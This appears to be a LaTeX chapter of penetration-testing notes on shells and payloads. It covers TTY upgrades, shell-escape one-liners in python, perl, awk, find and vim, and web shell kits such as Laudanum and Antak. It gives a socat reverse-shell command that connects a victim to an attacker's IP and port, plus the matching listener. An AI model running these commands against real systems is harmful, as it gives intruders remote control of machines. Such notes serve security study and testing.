\chapter{Shell and payloads}

\input{misc/shell/basic}
\input{misc/shell/crafting}

\section{Full TTY}

\url{https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys}


 \subsection{Python}
\begin{verbatim}
python -c 'import pty; pty.spawn("/bin/sh")'
\end{verbatim}


\subsection{netcat with magic}

\url{https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/}

First, follow the same technique as in Method 1 and use Python to spawn a PTY.
Once bash is running in the PTY, background the shell with \verb+Ctrl-Z+



\subsection{Socat}

\subsubsection{Victim}
\verb+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:IP:PORT+
\subsubsection{Attacker}

\verb+socat file:`tty`,raw,echo=0 tcp-listen:PORT+

\subsection{perl, ruby and others}
\begin{verbatim}
/bin/sh -i

perl â€”e 'exec "/bin/sh";'
perl: exec "/bin/sh";


ruby: exec "/bin/sh"

lua: os.execute('/bin/sh')

awk 'BEGIN {system("/bin/sh")}'

find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
find . -exec /bin/sh \; -quit

vim -c ':!/bin/sh'

vim
:set shell=/bin/sh
:shell
\end{verbatim}

\section{Web shells}
A web shell is a browser-based shell session that can be  use to interact with
the underlying operating system of a web server. 

\subsection{Laudanum}

\href{https://github.com/adamcaudill/laudanum}{Laudanum} ncludes injectable
files for many different web application languages to include asp, aspx, jsp,
php,\ldots

The shell file need to be edited since it restrict the IP allowed to access it.



\subsection{Antak}

Part of \href{https://github.com/samratashok/nishang}{Nishang project}
Modify the credential in the aspx file

\subsection{WhiteWinterWolf's PHP Web Shell}
